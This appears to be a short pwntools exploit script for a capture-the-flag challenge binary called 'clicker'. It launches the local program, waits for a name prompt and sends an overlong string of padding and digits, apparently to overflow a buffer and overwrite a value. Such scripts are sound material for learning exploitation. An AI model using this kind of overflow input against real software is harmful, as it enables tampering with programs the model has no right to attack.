 
from pwn import *
e = ELF("./clicker")
context.binary = e.path


p = process(e.path)
#p = gdb.debug(e.path)


p.recvuntil("What is your name?")
p.sendline("aaaaaaaa10000000000000000000000000000000000000")
